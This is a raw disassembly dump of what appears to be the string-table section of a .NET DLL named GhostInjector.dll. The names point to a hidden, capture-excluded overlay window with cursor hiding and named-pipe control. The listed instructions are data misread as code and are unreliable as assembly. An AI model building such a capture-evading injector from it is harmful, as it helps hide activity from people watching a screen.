10002c5d:	33 31                	xor    (%ecx),%esi
10002c5f:	5f                   	pop    %edi
10002c60:	30 00                	xor    %al,(%eax)
10002c62:	3c 53                	cmp    $0x53,%al
10002c64:	74 61                	je     0x10002cc7
10002c66:	72 74                	jb     0x10002cdc
10002c68:	43                   	inc    %ebx
10002c69:	75 72                	jne    0x10002cdd
10002c6b:	73 6f                	jae    0x10002cdc
10002c6d:	72 48                	jb     0x10002cb7
10002c6f:	69 64 65 54 68 72 65 	imul   $0x61657268,0x54(%ebp,%eiz,2),%esp
10002c76:	61 
10002c77:	64 3e 62 5f 5f       	fs bound %ebx,%ds:0x5f(%edi)
10002c7c:	33 31                	xor    (%ecx),%esi
10002c7e:	5f                   	pop    %edi
10002c7f:	30 00                	xor    %al,(%eax)
10002c81:	54                   	push   %esp
10002c82:	6f                   	outsl  %ds:(%esi),(%dx)
10002c83:	49                   	dec    %ecx
10002c84:	6e                   	outsb  %ds:(%esi),(%dx)
10002c85:	74 33                	je     0x10002cba
10002c87:	32 00                	xor    (%eax),%al
10002c89:	3c 3e                	cmp    $0x3e,%al
10002c8b:	39 00                	cmp    %eax,(%eax)
10002c8d:	3c 4d                	cmp    $0x4d,%al
10002c8f:	6f                   	outsl  %ds:(%esi),(%dx)
10002c90:	64 75 6c             	fs jne 0x10002cff
10002c93:	65 3e 00 57 53       	gs add %dl,%ds:0x53(%edi)
10002c98:	5f                   	pop    %edi
10002c99:	56                   	push   %esi
10002c9a:	49                   	dec    %ecx
10002c9b:	53                   	push   %ebx
10002c9c:	49                   	dec    %ecx
10002c9d:	42                   	inc    %edx
10002c9e:	4c                   	dec    %esp
10002c9f:	45                   	inc    %ebp
10002ca0:	00 57 44             	add    %dl,0x44(%edi)
10002ca3:	41                   	inc    %ecx
10002ca4:	5f                   	pop    %edi
10002ca5:	45                   	inc    %ebp
10002ca6:	58                   	pop    %eax
10002ca7:	43                   	inc    %ebx
10002ca8:	4c                   	dec    %esp
10002ca9:	55                   	push   %ebp
10002caa:	44                   	inc    %esp
10002cab:	45                   	inc    %ebp
10002cac:	46                   	inc    %esi
10002cad:	52                   	push   %edx
10002cae:	4f                   	dec    %edi
10002caf:	4d                   	dec    %ebp
10002cb0:	43                   	inc    %ebx
10002cb1:	41                   	inc    %ecx
10002cb2:	50                   	push   %eax
10002cb3:	54                   	push   %esp
10002cb4:	55                   	push   %ebp
10002cb5:	52                   	push   %edx
10002cb6:	45                   	inc    %ebp
10002cb7:	00 57 53             	add    %dl,0x53(%edi)
10002cba:	5f                   	pop    %edi
10002cbb:	45                   	inc    %ebp
10002cbc:	58                   	pop    %eax
10002cbd:	5f                   	pop    %edi
10002cbe:	4e                   	dec    %esi
10002cbf:	4f                   	dec    %edi
10002cc0:	41                   	inc    %ecx
10002cc1:	43                   	inc    %ebx
10002cc2:	54                   	push   %esp
10002cc3:	49                   	dec    %ecx
10002cc4:	56                   	push   %esi
10002cc5:	41                   	inc    %ecx
10002cc6:	54                   	push   %esp
10002cc7:	45                   	inc    %ebp
10002cc8:	00 53 79             	add    %dl,0x79(%ebx)
10002ccb:	73 74                	jae    0x10002d41
10002ccd:	65 6d                	gs insl (%dx),%es:(%edi)
10002ccf:	2e 49                	cs dec %ecx
10002cd1:	4f                   	dec    %edi
10002cd2:	00 57 53             	add    %dl,0x53(%edi)
10002cd5:	5f                   	pop    %edi
10002cd6:	50                   	push   %eax
10002cd7:	4f                   	dec    %edi
10002cd8:	50                   	push   %eax
10002cd9:	55                   	push   %ebp
10002cda:	50                   	push   %eax
10002cdb:	00 57 4e             	add    %dl,0x4e(%edi)
10002cde:	44                   	inc    %esp
10002cdf:	43                   	inc    %ebx
10002ce0:	4c                   	dec    %esp
10002ce1:	41                   	inc    %ecx
10002ce2:	53                   	push   %ebx
10002ce3:	53                   	push   %ebx
10002ce4:	00 57 53             	add    %dl,0x53(%edi)
10002ce7:	5f                   	pop    %edi
10002ce8:	45                   	inc    %ebp
10002ce9:	58                   	pop    %eax
10002cea:	5f                   	pop    %edi
10002ceb:	54                   	push   %esp
10002cec:	52                   	push   %edx
10002ced:	41                   	inc    %ecx
10002cee:	4e                   	dec    %esi
10002cef:	53                   	push   %ebx
10002cf0:	50                   	push   %eax
10002cf1:	41                   	inc    %ecx
10002cf2:	52                   	push   %edx
10002cf3:	45                   	inc    %ebp
10002cf4:	4e                   	dec    %esi
10002cf5:	54                   	push   %esp
10002cf6:	00 57 53             	add    %dl,0x53(%edi)
10002cf9:	5f                   	pop    %edi
10002cfa:	45                   	inc    %ebp
10002cfb:	58                   	pop    %eax
10002cfc:	5f                   	pop    %edi
10002cfd:	54                   	push   %esp
10002cfe:	4f                   	dec    %edi
10002cff:	4f                   	dec    %edi
10002d00:	4c                   	dec    %esp
10002d01:	57                   	push   %edi
10002d02:	49                   	dec    %ecx
10002d03:	4e                   	dec    %esi
10002d04:	44                   	inc    %esp
10002d05:	4f                   	dec    %edi
10002d06:	57                   	push   %edi
10002d07:	00 53 57             	add    %dl,0x57(%ebx)
10002d0a:	5f                   	pop    %edi
10002d0b:	53                   	push   %ebx
10002d0c:	48                   	dec    %eax
10002d0d:	4f                   	dec    %edi
10002d0e:	57                   	push   %edi
10002d0f:	00 67 65             	add    %ah,0x65(%edi)
10002d12:	74 5f                	je     0x10002d73
10002d14:	58                   	pop    %eax
10002d15:	00 67 65             	add    %ah,0x65(%edi)
10002d18:	74 5f                	je     0x10002d79
10002d1a:	59                   	pop    %ecx
10002d1b:	00 63 62             	add    %ah,0x62(%ebx)
10002d1e:	57                   	push   %edi
10002d1f:	6e                   	outsb  %ds:(%esi),(%dx)
10002d20:	64 45                	fs inc %ebp
10002d22:	78 74                	js     0x10002d98
10002d24:	72 61                	jb     0x10002d87
10002d26:	00 63 62             	add    %ah,0x62(%ebx)
10002d29:	43                   	inc    %ebx
10002d2a:	6c                   	insb   (%dx),%es:(%edi)
10002d2b:	73 45                	jae    0x10002d72
10002d2d:	78 74                	js     0x10002da3
10002d2f:	72 61                	jb     0x10002d92
10002d31:	00 6d 73             	add    %ch,0x73(%ebp)
10002d34:	63 6f 72             	arpl   %ebp,0x72(%edi)
10002d37:	6c                   	insb   (%dx),%es:(%edi)
10002d38:	69 62 00 3c 3e 63 00 	imul   $0x633e3c,0x0(%edx),%esp
10002d3f:	6c                   	insb   (%dx),%es:(%edi)
10002d40:	70 66                	jo     0x10002da8
10002d42:	6e                   	outsb  %ds:(%esi),(%dx)
10002d43:	57                   	push   %edi
10002d44:	6e                   	outsb  %ds:(%esi),(%dx)
10002d45:	64 50                	fs push %eax
10002d47:	72 6f                	jb     0x10002db8
10002d49:	63 00                	arpl   %eax,(%eax)
10002d4b:	5f                   	pop    %edi
10002d4c:	77 6e                	ja     0x10002dbc
10002d4e:	64 50                	fs push %eax
10002d50:	72 6f                	jb     0x10002dc1
10002d52:	63 00                	arpl   %eax,(%eax)
10002d54:	44                   	inc    %esp
10002d55:	65 66 57             	gs push %di
10002d58:	69 6e 64 6f 77 50 72 	imul   $0x7250776f,0x64(%esi),%ebp
10002d5f:	6f                   	outsl  %ds:(%esi),(%dx)
10002d60:	63 00                	arpl   %eax,(%eax)
10002d62:	52                   	push   %edx
10002d63:	65 61                	gs popa
10002d65:	64 00 53 74          	add    %dl,%fs:0x74(%ebx)
10002d69:	6f                   	outsl  %ds:(%esi),(%dx)
10002d6a:	70 43                	jo     0x10002daf
10002d6c:	75 72                	jne    0x10002de0
10002d6e:	73 6f                	jae    0x10002ddf
10002d70:	72 48                	jb     0x10002dba
10002d72:	69 64 65 54 68 72 65 	imul   $0x61657268,0x54(%ebp,%eiz,2),%esp
10002d79:	61 
10002d7a:	64 00 53 74          	add    %dl,%fs:0x74(%ebx)
10002d7e:	61                   	popa
10002d7f:	72 74                	jb     0x10002df5
10002d81:	43                   	inc    %ebx
10002d82:	75 72                	jne    0x10002df6
10002d84:	73 6f                	jae    0x10002df5
10002d86:	72 48                	jb     0x10002dd0
10002d88:	69 64 65 54 68 72 65 	imul   $0x61657268,0x54(%ebp,%eiz,2),%esp
10002d8f:	61 
10002d90:	64 00 5f 63          	add    %bl,%fs:0x63(%edi)
10002d94:	75 72                	jne    0x10002e08
10002d96:	73 6f                	jae    0x10002e07
10002d98:	72 48                	jb     0x10002de2
10002d9a:	69 64 65 54 68 72 65 	imul   $0x61657268,0x54(%ebp,%eiz,2),%esp
10002da1:	61 
10002da2:	64 00 4e 65          	add    %cl,%fs:0x65(%esi)
10002da6:	77 47                	ja     0x10002def
10002da8:	75 69                	jne    0x10002e13
10002daa:	64 00 68 57          	add    %ch,%fs:0x57(%eax)
10002dae:	6e                   	outsb  %ds:(%esi),(%dx)
10002daf:	64 00 5f 67          	add    %bl,%fs:0x67(%edi)
10002db3:	68 6f 73 74 57       	push   $0x5774736f
10002db8:	6e                   	outsb  %ds:(%esi),(%dx)
10002db9:	64 00 68 62          	add    %ch,%fs:0x62(%eax)
10002dbd:	72 42                	jb     0x10002e01
10002dbf:	61                   	popa
10002dc0:	63 6b 67             	arpl   %ebp,0x67(%ebx)
10002dc3:	72 6f                	jb     0x10002e34
10002dc5:	75 6e                	jne    0x10002e35
10002dc7:	64 00 73 65          	add    %dh,%fs:0x65(%ebx)
10002dcb:	74 5f                	je     0x10002e2c
10002dcd:	49                   	dec    %ecx
10002dce:	73 42                	jae    0x10002e12
10002dd0:	61                   	popa
10002dd1:	63 6b 67             	arpl   %ebp,0x67(%ebx)
10002dd4:	72 6f                	jb     0x10002e45
10002dd6:	75 6e                	jne    0x10002e46
10002dd8:	64 00 6d 65          	add    %ch,%fs:0x65(%ebp)
10002ddc:	74 68                	je     0x10002e46
10002dde:	6f                   	outsl  %ds:(%esi),(%dx)
10002ddf:	64 00 68 49          	add    %ch,%fs:0x49(%eax)
10002de3:	6e                   	outsb  %ds:(%esi),(%dx)
10002de4:	73 74                	jae    0x10002e5a
10002de6:	61                   	popa
10002de7:	6e                   	outsb  %ds:(%esi),(%dx)
10002de8:	63 65 00             	arpl   %esp,0x0(%ebp)
10002deb:	50                   	push   %eax
10002dec:	69 70 65 54 72 61 6e 	imul   $0x6e617254,0x65(%eax),%esi
10002df3:	73 6d                	jae    0x10002e62
10002df5:	69 73 73 69 6f 6e 4d 	imul   $0x4d6e6f69,0x73(%ebx),%esi
10002dfc:	6f                   	outsl  %ds:(%esi),(%dx)
10002dfd:	64 65 00 47 68       	fs add %al,%gs:0x68(%edi)
10002e02:	6f                   	outsl  %ds:(%esi),(%dx)
10002e03:	73 74                	jae    0x10002e79
10002e05:	4d                   	dec    %ebp
10002e06:	6f                   	outsl  %ds:(%esi),(%dx)
10002e07:	64 65 00 67 65       	fs add %ah,%gs:0x65(%edi)
10002e0c:	74 5f                	je     0x10002e6d
10002e0e:	4d                   	dec    %ebp
10002e0f:	65 73 73             	gs jae 0x10002e85
10002e12:	61                   	popa
10002e13:	67 65 00 45 6e       	add    %al,%gs:0x6e(%di)
10002e18:	64 49                	fs dec %ecx
10002e1a:	6e                   	outsb  %ds:(%esi),(%dx)
10002e1b:	76 6f                	jbe    0x10002e8c
10002e1d:	6b 65 00 42          	imul   $0x42,0x0(%ebp),%esp
10002e21:	65 67 69 6e 49 6e 76 	imul   $0x6b6f766e,%gs:0x49(%bp),%ebp
10002e28:	6f 6b 
10002e2a:	65 00 49 44          	add    %cl,%gs:0x44(%ecx)
10002e2e:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
10002e35:	6c                   	insb   (%dx),%es:(%edi)
10002e36:	65 00 47 65          	add    %al,%gs:0x65(%edi)
10002e3a:	74 4d                	je     0x10002e89
10002e3c:	6f                   	outsl  %ds:(%esi),(%dx)
10002e3d:	64 75 6c             	fs jne 0x10002eac
10002e40:	65 48                	gs dec %eax
10002e42:	61                   	popa
10002e43:	6e                   	outsb  %ds:(%esi),(%dx)
10002e44:	64 6c                	fs insb (%dx),%es:(%edi)
10002e46:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
10002e4a:	63 74 61 6e          	arpl   %esi,0x6e(%ecx,%eiz,2)
10002e4e:	67 6c                	insb   (%dx),%es:(%di)
10002e50:	65 00 64 77 53       	add    %ah,%gs:0x53(%edi,%esi,2)
10002e55:	74 79                	je     0x10002ed0
10002e57:	6c                   	insb   (%dx),%es:(%edi)
10002e58:	65 00 64 77 45       	add    %ah,%gs:0x45(%edi,%esi,2)
10002e5d:	78 53                	js     0x10002eb2
10002e5f:	74 79                	je     0x10002eda
10002e61:	6c                   	insb   (%dx),%es:(%edi)
10002e62:	65 00 73 74          	add    %dh,%gs:0x74(%ebx)
10002e66:	79 6c                	jns    0x10002ed4
10002e68:	65 00 6c 70 4d       	add    %ch,%gs:0x4d(%eax,%esi,2)
10002e6d:	6f                   	outsl  %ds:(%esi),(%dx)
10002e6e:	64 75 6c             	fs jne 0x10002edd
10002e71:	65 4e                	gs dec %esi
10002e73:	61                   	popa
10002e74:	6d                   	insl   (%dx),%es:(%edi)
10002e75:	65 00 70 69          	add    %dh,%gs:0x69(%eax)
10002e79:	70 65                	jo     0x10002ee0
10002e7b:	4e                   	dec    %esi
10002e7c:	61                   	popa
10002e7d:	6d                   	insl   (%dx),%es:(%edi)
10002e7e:	65 00 6c 70 43       	add    %ch,%gs:0x43(%eax,%esi,2)
10002e83:	6c                   	insb   (%dx),%es:(%edi)
10002e84:	61                   	popa
10002e85:	73 73                	jae    0x10002efa
10002e87:	4e                   	dec    %esi
10002e88:	61                   	popa
10002e89:	6d                   	insl   (%dx),%es:(%edi)
10002e8a:	65 00 6c 70 73       	add    %ch,%gs:0x73(%eax,%esi,2)
10002e8f:	7a 43                	jp     0x10002ed4
10002e91:	6c                   	insb   (%dx),%es:(%edi)
10002e92:	61                   	popa
10002e93:	73 73                	jae    0x10002f08
10002e95:	4e                   	dec    %esi
10002e96:	61                   	popa
10002e97:	6d                   	insl   (%dx),%es:(%edi)
10002e98:	65 00 6c 70 73       	add    %ch,%gs:0x73(%eax,%esi,2)
10002e9d:	7a 4d                	jp     0x10002eec
10002e9f:	65 6e                	outsb  %gs:(%esi),(%dx)
10002ea1:	75 4e                	jne    0x10002ef1
10002ea3:	61                   	popa
10002ea4:	6d                   	insl   (%dx),%es:(%edi)
10002ea5:	65 00 6c 70 57       	add    %ch,%gs:0x57(%eax,%esi,2)
10002eaa:	69 6e 64 6f 77 4e 61 	imul   $0x614e776f,0x64(%esi),%ebp
10002eb1:	6d                   	insl   (%dx),%es:(%edi)
10002eb2:	65 00 56 61          	add    %dl,%gs:0x61(%esi)
10002eb6:	6c                   	insb   (%dx),%es:(%edi)
10002eb7:	75 65                	jne    0x10002f1e
10002eb9:	54                   	push   %esp
10002eba:	79 70                	jns    0x10002f2c
10002ebc:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
10002ec0:	73 74                	jae    0x10002f36
10002ec2:	65 6d                	gs insl (%dx),%es:(%edi)
10002ec4:	2e 43                	cs inc %ebx
10002ec6:	6f                   	outsl  %ds:(%esi),(%dx)
10002ec7:	72 65                	jb     0x10002f2e
10002ec9:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
10002ecd:	70 6f                	jo     0x10002f3e
10002ecf:	73 65                	jae    0x10002f36
10002ed1:	00 57 6e             	add    %dl,0x6e(%edi)
10002ed4:	64 50                	fs push %eax
10002ed6:	72 6f                	jb     0x10002f47
10002ed8:	63 44 65 6c          	arpl   %eax,0x6c(%ebp,%eiz,2)
10002edc:	65 67 61             	gs addr16 popa
10002edf:	74 65                	je     0x10002f46
10002ee1:	00 47 65             	add    %al,0x65(%edi)
10002ee4:	74 46                	je     0x10002f2c
10002ee6:	75 6e                	jne    0x10002f56
10002ee8:	63 74 69 6f          	arpl   %esi,0x6f(%ecx,%ebp,2)
10002eec:	6e                   	outsb  %ds:(%esi),(%dx)
10002eed:	50                   	push   %eax
10002eee:	6f                   	outsl  %ds:(%esi),(%dx)
10002eef:	69 6e 74 65 72 46 6f 	imul   $0x6f467265,0x74(%esi),%ebp
10002ef6:	72 44                	jb     0x10002f3c
10002ef8:	65 6c                	gs insb (%dx),%es:(%edi)
10002efa:	65 67 61             	gs addr16 popa
10002efd:	74 65                	je     0x10002f64
10002eff:	00 4d 75             	add    %cl,0x75(%ebp)
10002f02:	6c                   	insb   (%dx),%es:(%edi)
10002f03:	74 69                	je     0x10002f6e
10002f05:	63 61 73             	arpl   %esp,0x73(%ecx)
10002f08:	74 44                	je     0x10002f4e
10002f0a:	65 6c                	gs insb (%dx),%es:(%edi)
10002f0c:	65 67 61             	gs addr16 popa
10002f0f:	74 65                	je     0x10002f76
10002f11:	00 43 6f             	add    %al,0x6f(%ebx)
10002f14:	6d                   	insl   (%dx),%es:(%edi)
10002f15:	70 69                	jo     0x10002f80
10002f17:	6c                   	insb   (%dx),%es:(%edi)
10002f18:	65 72 47             	gs jb  0x10002f62
10002f1b:	65 6e                	outsb  %gs:(%esi),(%dx)
10002f1d:	65 72 61             	gs jb  0x10002f81
10002f20:	74 65                	je     0x10002f87
10002f22:	64 41                	fs inc %ecx
10002f24:	74 74                	je     0x10002f9a
10002f26:	72 69                	jb     0x10002f91
10002f28:	62 75 74             	bound  %esi,0x74(%ebp)
10002f2b:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
10002f30:	75 67                	jne    0x10002f99
10002f32:	67 61                	addr16 popa
10002f34:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
10002f38:	74 74                	je     0x10002fae
10002f3a:	72 69                	jb     0x10002fa5
10002f3c:	62 75 74             	bound  %esi,0x74(%ebp)
10002f3f:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
10002f43:	6d                   	insl   (%dx),%es:(%edi)
10002f44:	70 69                	jo     0x10002faf
10002f46:	6c                   	insb   (%dx),%es:(%edi)
10002f47:	61                   	popa
10002f48:	74 69                	je     0x10002fb3
10002f4a:	6f                   	outsl  %ds:(%esi),(%dx)
10002f4b:	6e                   	outsb  %ds:(%esi),(%dx)
10002f4c:	52                   	push   %edx
10002f4d:	65 6c                	gs insb (%dx),%es:(%edi)
10002f4f:	61                   	popa
10002f50:	78 61                	js     0x10002fb3
10002f52:	74 69                	je     0x10002fbd
10002f54:	6f                   	outsl  %ds:(%esi),(%dx)
10002f55:	6e                   	outsb  %ds:(%esi),(%dx)
10002f56:	73 41                	jae    0x10002f99
10002f58:	74 74                	je     0x10002fce
10002f5a:	72 69                	jb     0x10002fc5
10002f5c:	62 75 74             	bound  %esi,0x74(%ebp)
10002f5f:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
10002f63:	6e                   	outsb  %ds:(%esi),(%dx)
10002f64:	74 69                	je     0x10002fcf
10002f66:	6d                   	insl   (%dx),%es:(%edi)
10002f67:	65 43                	gs inc %ebx
10002f69:	6f                   	outsl  %ds:(%esi),(%dx)
10002f6a:	6d                   	insl   (%dx),%es:(%edi)
10002f6b:	70 61                	jo     0x10002fce
10002f6d:	74 69                	je     0x10002fd8
10002f6f:	62 69 6c             	bound  %ebp,0x6c(%ecx)
10002f72:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
10002f79:	69 
10002f7a:	62 75 74             	bound  %esi,0x74(%ebp)
10002f7d:	65 00 42 79          	add    %al,%gs:0x79(%edx)
10002f81:	74 65                	je     0x10002fe8
10002f83:	00 67 65             	add    %ah,0x65(%edi)
10002f86:	74 5f                	je     0x10002fe7
10002f88:	49                   	dec    %ecx
10002f89:	73 41                	jae    0x10002fcc
10002f8b:	6c                   	insb   (%dx),%es:(%edi)
10002f8c:	69 76 65 00 5f 67 68 	imul   $0x68675f00,0x65(%esi),%esi
10002f93:	6f                   	outsl  %ds:(%esi),(%dx)
10002f94:	73 74                	jae    0x1000300a
10002f96:	41                   	inc    %ecx
10002f97:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
10002f9b:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
10002f9f:	73 74                	jae    0x10003015
10002fa1:	65 6d                	gs insl (%dx),%es:(%edi)
10002fa3:	2e 54                	cs push %esp
10002fa5:	68 72 65 61 64       	push   $0x64616572
10002faa:	69 6e 67 00 4f 75 74 	imul   $0x74754f00,0x67(%esi),%ebp
10002fb1:	70 75                	jo     0x10003028
10002fb3:	74 44                	je     0x10002ff9
10002fb5:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
10002fb9:	53                   	push   %ebx
10002fba:	74 72                	je     0x1000302e
10002fbc:	69 6e 67 00 54 6f 53 	imul   $0x536f5400,0x67(%esi),%ebp
10002fc3:	74 72                	je     0x10003037
10002fc5:	69 6e 67 00 6c 70 4f 	imul   $0x4f706c00,0x67(%esi),%ebp
10002fcc:	75 74                	jne    0x10003042
10002fce:	70 75                	jo     0x10003045
10002fd0:	74 53                	je     0x10003025
10002fd2:	74 72                	je     0x10003046
10002fd4:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
10002fdb:	74 65                	je     0x10003042
10002fdd:	6d                   	insl   (%dx),%es:(%edi)
10002fde:	2e 44                	cs inc %esp
10002fe0:	72 61                	jb     0x10003043
10002fe2:	77 69                	ja     0x1000304d
10002fe4:	6e                   	outsb  %ds:(%esi),(%dx)
10002fe5:	67 00 75 4d          	add    %dh,0x4d(%di)
10002fe9:	73 67                	jae    0x10003052
10002feb:	00 6d 73             	add    %ch,0x73(%ebp)
10002fee:	67 00 67 65          	add    %ah,0x65(%bx)
10002ff2:	74 5f                	je     0x10003053
10002ff4:	57                   	push   %edi
10002ff5:	69 64 74 68 00 6e 57 	imul   $0x69576e00,0x68(%esp,%esi,2),%esp
10002ffc:	69 
10002ffd:	64 74 68             	fs je  0x10003068
10003000:	00 41 73             	add    %al,0x73(%ecx)
10003003:	79 6e                	jns    0x10003073
10003005:	63 43 61             	arpl   %eax,0x61(%ebx)
10003008:	6c                   	insb   (%dx),%es:(%edi)
10003009:	6c                   	insb   (%dx),%es:(%edi)
1000300a:	62 61 63             	bound  %esp,0x63(%ecx)
1000300d:	6b 00 63             	imul   $0x63,(%eax),%eax
10003010:	61                   	popa
10003011:	6c                   	insb   (%dx),%es:(%edi)
10003012:	6c                   	insb   (%dx),%es:(%edi)
10003013:	62 61 63             	bound  %esp,0x63(%ecx)
10003016:	6b 00 4d             	imul   $0x4d,(%eax),%eax
10003019:	61                   	popa
1000301a:	72 73                	jb     0x1000308f
1000301c:	68 61 6c 00 6b       	push   $0x6b006c61
10003021:	65 72 6e             	gs jb  0x10003092
10003024:	65 6c                	gs insb (%dx),%es:(%edi)
10003026:	33 32                	xor    (%edx),%esi
10003028:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
1000302b:	6c                   	insb   (%dx),%es:(%edi)
1000302c:	00 75 73             	add    %dh,0x73(%ebp)
1000302f:	65 72 33             	gs jb  0x10003065
10003032:	32 2e                	xor    (%esi),%ch
10003034:	64 6c                	fs insb (%dx),%es:(%edi)
10003036:	6c                   	insb   (%dx),%es:(%edi)
10003037:	00 47 68             	add    %al,0x68(%edi)
1000303a:	6f                   	outsl  %ds:(%esi),(%dx)
1000303b:	73 74                	jae    0x100030b1
1000303d:	49                   	dec    %ecx
1000303e:	6e                   	outsb  %ds:(%esi),(%dx)
1000303f:	6a 65                	push   $0x65
10003041:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
10003045:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
10003048:	6c                   	insb   (%dx),%es:(%edi)
10003049:	00 77 69             	add    %dh,0x69(%edi)
1000304c:	6e                   	outsb  %ds:(%esi),(%dx)
1000304d:	33 32                	xor    (%edx),%esi
1000304f:	75 2e                	jne    0x1000307f
10003051:	64 6c                	fs insb (%dx),%es:(%edi)
10003053:	6c                   	insb   (%dx),%es:(%edi)
10003054:	00 4e 61             	add    %cl,0x61(%esi)
10003057:	6d                   	insl   (%dx),%es:(%edi)
10003058:	65 64 50             	gs fs push %eax
1000305b:	69 70 65 53 65 72 76 	imul   $0x76726553,0x65(%eax),%esi
10003062:	65 72 53             	gs jb  0x100030b8
10003065:	74 72                	je     0x100030d9
10003067:	65 61                	gs popa
10003069:	6d                   	insl   (%dx),%es:(%edi)
1000306a:	00 6c 50 61          	add    %ch,0x61(%eax,%edx,2)
1000306e:	72 61                	jb     0x100030d1
10003070:	6d                   	insl   (%dx),%es:(%edi)
10003071:	00 6c 70 50          	add    %ch,0x50(%eax,%esi,2)
10003075:	61                   	popa
10003076:	72 61                	jb     0x100030d9
10003078:	6d                   	insl   (%dx),%es:(%edi)
10003079:	00 77 50             	add    %dh,0x50(%edi)
1000307c:	61                   	popa
1000307d:	72 61                	jb     0x100030e0
1000307f:	6d                   	insl   (%dx),%es:(%edi)
10003080:	00 53 79             	add    %dl,0x79(%ebx)
10003083:	73 74                	jae    0x100030f9
10003085:	65 6d                	gs insl (%dx),%es:(%edi)
10003087:	00 67 65             	add    %ah,0x65(%edi)
1000308a:	74 5f                	je     0x100030eb
1000308c:	50                   	push   %eax
1000308d:	72 69                	jb     0x100030f8
1000308f:	6d                   	insl   (%dx),%es:(%edi)
10003090:	61                   	popa
10003091:	72 79                	jb     0x1000310c
10003093:	53                   	push   %ebx
10003094:	63 72 65             	arpl   %esi,0x65(%edx)
10003097:	65 6e                	outsb  %gs:(%esi),(%dx)
10003099:	00 4a 6f             	add    %cl,0x6f(%edx)
1000309c:	69 6e 00 68 49 63 6f 	imul   $0x6f634968,0x0(%esi),%ebp
100030a3:	6e                   	outsb  %ds:(%esi),(%dx)
100030a4:	00 55 6e             	add    %dl,0x6e(%ebp)
100030a7:	69 6f 6e 00 57 61 69 	imul   $0x69615700,0x6e(%edi),%ebp
100030ae:	74 46                	je     0x100030f6
100030b0:	6f                   	outsl  %ds:(%esi),(%dx)
100030b1:	72 43                	jb     0x100030f6
100030b3:	6f                   	outsl  %ds:(%esi),(%dx)
100030b4:	6e                   	outsb  %ds:(%esi),(%dx)
100030b5:	6e                   	outsb  %ds:(%esi),(%dx)
100030b6:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
100030bb:	6e                   	outsb  %ds:(%esi),(%dx)
100030bc:	00 50 69             	add    %dl,0x69(%eax)
100030bf:	70 65                	jo     0x10003126
100030c1:	44                   	inc    %esp
100030c2:	69 72 65 63 74 69 6f 	imul   $0x6f697463,0x65(%edx),%esi
100030c9:	6e                   	outsb  %ds:(%esi),(%dx)
100030ca:	00 45 78             	add    %al,0x78(%ebp)
100030cd:	63 65 70             	arpl   %esp,0x70(%ebp)
100030d0:	74 69                	je     0x1000313b
100030d2:	6f                   	outsl  %ds:(%esi),(%dx)
100030d3:	6e                   	outsb  %ds:(%esi),(%dx)
100030d4:	00 5a 65             	add    %bl,0x65(%edx)
100030d7:	72 6f                	jb     0x10003148
100030d9:	00 53 6c             	add    %dl,0x6c(%ebx)
100030dc:	65 65 70 00          	gs gs jo 0x100030e0
100030e0:	42                   	inc    %edx
100030e1:	69 74 43 6f 6e 76 65 	imul   $0x7265766e,0x6f(%ebx,%eax,2),%esi
100030e8:	72 
100030e9:	74 65                	je     0x10003150
100030eb:	72 00                	jb     0x100030ed
100030ed:	50                   	push   %eax
100030ee:	69 70 65 53 65 72 76 	imul   $0x76726553,0x65(%eax),%esi
100030f5:	65 72 00             	gs jb  0x100030f8
100030f8:	68 43 75 72 73       	push   $0x73727543
100030fd:	6f                   	outsl  %ds:(%esi),(%dx)
100030fe:	72 00                	jb     0x10003100
10003100:	53                   	push   %ebx
10003101:	68 6f 77 43 75       	push   $0x7543776f
10003106:	72 73                	jb     0x1000317b
10003108:	6f                   	outsl  %ds:(%esi),(%dx)
10003109:	72 00                	jb     0x1000310b
1000310b:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
10003110:	00 2e                	add    %ch,(%esi)
10003112:	63 63 74             	arpl   %esp,0x74(%ebx)
10003115:	6f                   	outsl  %ds:(%esi),(%dx)
10003116:	72 00                	jb     0x10003118
10003118:	47                   	inc    %edi
10003119:	68 6f 73 74 49       	push   $0x4974736f
1000311e:	6e                   	outsb  %ds:(%esi),(%dx)
1000311f:	6a 65                	push   $0x65
10003121:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
10003125:	00 49 6e             	add    %cl,0x6e(%ecx)
10003128:	74 50                	je     0x1000317a
1000312a:	74 72                	je     0x1000319e
1000312c:	00 53 79             	add    %dl,0x79(%ebx)
1000312f:	73 74                	jae    0x100031a5
10003131:	65 6d                	gs insl (%dx),%es:(%edi)
10003133:	2e 44                	cs inc %esp
10003135:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
1000313c:	69 63 73 00 67 65 74 	imul   $0x74656700,0x73(%ebx),%esp
10003143:	5f                   	pop    %edi
10003144:	42                   	inc    %edx
10003145:	6f                   	outsl  %ds:(%esi),(%dx)
10003146:	75 6e                	jne    0x100031b6
10003148:	64 73 00             	fs jae 0x1000314b
1000314b:	53                   	push   %ebx
1000314c:	79 73                	jns    0x100031c1
1000314e:	74 65                	je     0x100031b5
10003150:	6d                   	insl   (%dx),%es:(%edi)
10003151:	2e 52                	cs push %edx
10003153:	75 6e                	jne    0x100031c3
10003155:	74 69                	je     0x100031c0
10003157:	6d                   	insl   (%dx),%es:(%edi)
10003158:	65 2e 49             	gs cs dec %ecx
1000315b:	6e                   	outsb  %ds:(%esi),(%dx)
1000315c:	74 65                	je     0x100031c3
1000315e:	72 6f                	jb     0x100031cf
10003160:	70 53                	jo     0x100031b5
10003162:	65 72 76             	gs jb  0x100031db
10003165:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
